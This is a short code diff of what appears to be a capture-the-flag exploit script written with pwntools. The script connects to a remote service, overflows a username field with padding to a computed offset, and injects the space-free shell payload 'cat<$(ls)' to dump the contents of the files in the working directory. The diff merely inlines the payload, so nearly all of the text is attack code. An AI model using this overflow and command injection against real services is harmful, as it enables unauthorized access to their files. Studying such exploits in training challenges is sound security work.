@@ -2,7 +2,6 @@ from pwn import *
 
 hostname = ...
 port = ...
-
 p = remote(hostname, port)
 
 # Compute offset required to overwrite
@@ -14,9 +13,7 @@ p.recvuntil(b"username: ")
 
 # Scanf stops at first whitespace
 # This payload cats the result of ls without spaces
-payload = b"cat<$(ls)"
-name = b"a"*diff + payload
-
+name = b"a"*diff + b"cat<$(ls)"
 p.sendline(name)
 
 res = p.recvline()
